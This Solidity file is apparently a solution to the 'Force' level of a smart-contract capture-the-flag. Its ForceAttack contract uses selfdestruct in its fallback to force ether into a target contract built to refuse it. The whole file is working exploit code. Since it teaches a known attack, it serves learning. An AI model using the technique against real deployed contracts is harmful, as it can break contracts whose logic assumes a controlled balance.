// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./07-Force.sol";

contract ForceAttack {

    address payable _forceAddress;

    constructor(address payable _address) public {
        _forceAddress = _address;
    }

    fallback() external payable {
        selfdestruct(_forceAddress);
    }
}